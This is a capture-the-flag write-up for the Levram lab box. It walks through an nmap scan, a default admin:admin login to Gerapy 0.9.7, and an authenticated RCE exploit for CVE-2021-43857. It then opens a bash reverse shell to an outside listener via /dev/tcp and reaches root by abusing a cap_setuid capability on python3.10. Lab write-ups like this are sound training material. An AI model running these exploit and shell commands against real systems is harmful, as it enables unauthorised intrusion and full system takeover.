# CTF Writeup: Levram

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 11:09 EST
Nmap scan report for 192.168.130.24
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.34 ms 192.168.45.1
2   26.60 ms 192.168.45.254
3   27.40 ms 192.168.251.1
4   27.45 ms 192.168.130.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.71 seconds
```

The Website running on port 8000, seems to be running "Gerapy" as application.

Logged in with default credentials admin:admin and retrieved Version Information.

```
Gerapy 0.9.7
```

## Vulnerability Assessment

Searched up for CVE's

```
searchsploit Gerapy 0.9.7
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                                                  | python/remote/50640.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Downloaded the exploit locally.

Note that it's important to navigate into the cms and create an project, before running the exploit.

Gained RCE as user "app".

```
python exploit.py -t 192.168.130.24 -p 8000 -L 192.168.45.221 -P 8000
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: dwqdwqq
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 8000 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.24] 56926
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

Improving Shell.

Started up listener on port 22.

```
nc -lvnp 22
```

Utilized the following command in order to get RCE on my listener on port 22.

```
app@ubuntu:~/gerapy$ bash -i >& /dev/tcp/192.168.45.221/22 0>&1
```

Gained RCE.

```
nc -lvnp 22  
listening on [any] 22 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.24] 42668
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

Retrieved local.txt in /home/app directory.

```
564ba586041a709299d8a37488f01bb1
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Searched up for capabilities.

```
app@ubuntu:~$ getcap -r / 2>/dev/null
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

The python3.10 binary seemed very interesting.

Utilized the PoC on www.gtfobins.github.io and gained RCE as user "root".

```
app@ubuntu:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

Retrieved proof.txt in /root directory.

```
b17a1d6786f3bfda4271e88591551990
```
